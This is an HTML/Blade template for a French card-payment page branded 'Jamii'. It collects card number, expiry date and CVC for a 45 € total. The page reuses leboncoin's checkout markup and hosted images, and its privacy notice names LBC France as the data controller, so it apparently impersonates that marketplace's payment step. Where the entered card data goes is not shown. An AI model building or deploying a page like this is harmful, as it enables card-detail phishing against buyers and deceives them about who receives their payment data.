<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Jamii</title>
    <link href="https://fonts.googleapis.com/css?family=Poppins:400,700" rel="stylesheet">
    <!-- Google font -->
    <link href="https://fonts.googleapis.com/css?family=Poppins:400,700" rel="stylesheet">
    <link href='https://fonts.googleapis.com/css?family=Alex Brush' rel='stylesheet'>

    <!-- Bootstrap -->
    <link type="text/css" rel="stylesheet" href="{{asset('css/bootstrap.min.css')}}" />

    <!-- Owl Carousel -->
    <link type="text/css" rel="stylesheet" href="{{asset('css/owl.carousel.css')}}" />
    <link type="text/css" rel="stylesheet" href="{{asset('css/owl.theme.default.css')}}" />

    <!-- Magnific Popup -->
    <link type="text/css" rel="stylesheet" href="{{asset('css/magnific-popup.css')}}" />

    <!-- Font Awesome Icon -->
    <link rel="stylesheet" href="{{asset('css/font-awesome.min.css')}}">

    <!-- Custom stlylesheet -->

    <link rel="stylesheet" href="{{asset('css/pay.css')}}">
    <link type="text/css" rel="stylesheet" href="{{asset('css/header.css')}}">

</head>

<body>

    <header>
        <div class="_2zoz9">
            <nav class="_2_L_T">
                <a title="Retour" data-test-id="link" class="trackable">
                    <div class="_3swxq">
                        <span class="_1oSml _1Cvux _3FKvu">
                            <svg data-name="Calque 1" viewBox="0 0 24 24" width="1em" height="1em">
                                <path
                                    d="M22.46 10.43H5.26l7.51-7.72a1.63 1.63 0 0 0 0-2.25 1.52 1.52 0 0 0-2.17 0L.45 10.88a1.61 1.61 0 0 0 0 2.23L10.6 23.54a1.52 1.52 0 0 0 2.17 0 1.61 1.61 0 0 0 0-2.23l-7.51-7.72h17.2a1.58 1.58 0 0 0 0-3.16z">
                                </path>
                            </svg>
                        </span>
                        <span class="_3ugrI _1u8Yi">Retour</span>

                    </div>
                </a>

                <div class="h1ePP">
                    <div class="_2qvq6">
                        <h2 class="_logo">
                            <font style="vertical-align: inherit;">
                                <font style="vertical-align: inherit;">Jamii</font>
                            </font>
                        </h2>
                    </div>

                </div>
            </nav>

        </div>
    </header>

    <div class="_1i0e0 _1auRJ" style="margin-top:80px">
        <div>
            <section class="_1B6_e">
                <section>
                    <h2>Total : 45,00 € TTC </h2>
                </section>

                <section class="S6kt5">
                    <h2>Saisissez votre numéro de carte bancaire</h2>
                    <form method="POST" id="adyen-encrypted-form">
                        <ul>
                            <li class="_2ZsK8"><img
                                    src="//static-rav.leboncoin.fr/c618edcfb1b2e8de4181e98117836b2a.png"><img
                                    src="//static-rav.leboncoin.fr/3372f2f8b0f0e200a0b390db08d793b9.png"><img
                                    src="//static-rav.leboncoin.fr/f19f3e05905b4e4a3e649e419ad65556.png"><span
                                    class="_1vK7W _3D9j0" name="lock"><svg viewBox="0 0 24 24" data-name="Calque 1"
                                        focusable="false">
                                        <path
                                            d="M18.75 8h-1.13V5.71a5.62 5.62 0 1 0-11.24 0V8H5.25A2.27 2.27 0 0 0 3 10.29v11.42A2.27 2.27 0 0 0 5.25 24h13.5A2.27 2.27 0 0 0 21 21.71V10.29A2.27 2.27 0 0 0 18.75 8zM12 18.29A2.29 2.29 0 1 1 14.25 16 2.27 2.27 0 0 1 12 18.29zM15.38 8H8.62V5.71a3.38 3.38 0 1 1 6.76 0z">
                                        </path>
                                    </svg></span></li>
                            <li><label for="card_number">Numéro de carte *</label><input type="text" id="card_number"
                                    data-encrypted-name="card_number" autocomplete="off" maxlength="19" value=""
                                    class=""></li>
                            <li><label>Expire fin *</label>
                                <div class="_6wDtW">
                                    <div class="selectWrapper _2mFNZ"><select type="select" data-encrypted-name="exp_mm"
                                            autocomplete="off" data-qa-id="card_exp_mm" class="select">
                                            <option value="01">01</option>
                                            <option value="02">02</option>
                                            <option value="03">03</option>
                                            <option value="04">04</option>
                                            <option value="05">05</option>
                                            <option value="06">06</option>
                                            <option value="07">07</option>
                                            <option value="08">08</option>
                                            <option value="09">09</option>
                                            <option value="10">10</option>
                                            <option value="11">11</option>
                                            <option value="12">12</option>
                                        </select></div><span class="_3af6D">/</span>
                                    <div class="selectWrapper _2mFNZ"><select type="select" data-encrypted-name="exp_yy"
                                            data-qa-id="card_exp_aaaa" autocomplete="off" class="select">
                                            <option value="2019">2019</option>
                                            <option value="2020">2020</option>
                                            <option value="2021">2021</option>
                                            <option value="2022">2022</option>
                                            <option value="2023">2023</option>
                                            <option value="2024">2024</option>
                                            <option value="2025">2025</option>
                                            <option value="2026">2026</option>
                                            <option value="2027">2027</option>
                                            <option value="2028">2028</option>
                                        </select></div>
                                </div>
                            </li>
                            <li><label for="cvc">Cryptogramme *</label><input type="text" id="cvc"
                                    data-encrypted-name="cvc" autocomplete="off" maxlength="3" size="4" value=""
                                    class=""></li>
                        </ul><button class="_2sNbI _1xIyN _2xk2l" type="submit" data-qa-id="deal_payment_submit">
                            <!-- react-text: 157 -->Valider
                            <!-- /react-text --></button>
                    </form>
                 <div class="_2e0qf">Informations:</div>
                    <div class="_38Fo3"><span class="_1JWO_" id="span1"><img
                                src="//static-rav.leboncoin.fr/46c5e452fd381c4d2b435ac7eff43df9.png"></span>
                        <div class="D0sVS">
                            <div class="ezWFo">Le responsable de traitement, les destinataires et la finalité de la
                                collecte des données.</div>
                            <div class="_2CroS" id="cr_1" style="display:none">Dans le cadre de l’exécution du contrat qui nous lie, vos données de paiement sont indispensables à LBC France pour donner suite à votre paiement. A cette fin, elles sont transmises à notre prestataire de service de paiement, qui concourt techniquement à réaliser la finalité ci-dessus. Nous sommes susceptibles de traiter vos données de manière automatisée à des fins de lutte contre la fraude. Ce traitement pourra donner lieu à un blocage automatique de votre transaction.</div>
                        </div>
                    </div>
                    <div class="_38Fo3"><span class="_1JWO_" id="span2"><img
                                src="//static-rav.leboncoin.fr/46c5e452fd381c4d2b435ac7eff43df9.png"></span>
                        <div class="D0sVS">
                            <div class="ezWFo">En savoir plus sur vos droits, la durée de conservation de vos données et
                                les moyens de nous contacter</div>
                             <div class="_2CroS" id="cr_2" style="display:none"><!-- react-text: 279 -->Vos données seront conservées par notre prestataire de paiement pendant 13 mois, à l’exception du cryptogramme que notre prestataire ne conserve que le temps d’exécuter la transaction. Pour plus d’informations sur vos droits, contactez notre <!-- /react-text --><!-- react-text: 280 --><!-- /react-text --><a href="https://assistance.leboncoin.info/hc/fr" target="_blank" rel="noopener">service client</a><!-- react-text: 282 -->, ou<!-- /react-text --><a href="https://www.leboncoin.fr/dc/cookies/#19" target="_blank" rel="noopener"><!-- react-text: 284 --><!-- /react-text --><!-- react-text: 285 --> notre délégué à la protection des données.<!-- /react-text --></a></div>
                        </div>
                    </div>
                </section>
            </section>
        </div>
    </div>
    <footer class="_2TcK4">
        <div class="_2cF5E">
            <div class="_1-1SA">
                <span>Jamii 2019 - 2030</span>
            </div>
        </div>
    </footer>



</body>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
<script type="text/javascript" src="{{asset('js/owl.carousel.min.js')}}"></script>

<script type="text/javascript" src="{{asset('js/jquery.magnific-popup.js')}}"></script>
<script type="text/javascript" src="{{asset('js/main.js')}}"></script>

<script>

$(document).ready(function(){

      var flag=true;
    $('#span1').click(function(){
       if(flag)
       {
           $('#cr_1').css('display','block');
           flag=false;
       }
       else{
        $('#cr_1').css('display','none');
           flag=true;
       }
    });
    $('#span2').click(function(){
        console.log('test');
       if(flag)
       {
           $('#cr_2').css('display','block');
           flag=false;
       }
       else{
        $('#cr_2').css('display','none');
           flag=true;
       }
    });



});

</script>


</html>